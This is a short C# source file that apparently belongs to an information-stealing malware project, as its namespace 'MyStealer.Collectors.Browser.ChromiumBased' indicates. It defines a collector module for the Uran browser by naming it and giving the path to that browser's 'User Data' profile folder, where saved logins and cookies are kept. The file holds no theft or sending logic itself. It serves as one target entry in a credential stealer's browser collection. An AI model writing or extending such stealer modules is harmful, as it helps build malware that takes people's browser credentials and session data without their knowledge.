using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class Uran : Chromium
    {
        public override string ModuleName => "Uran";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia", "Uran", "User Data");
    }
}
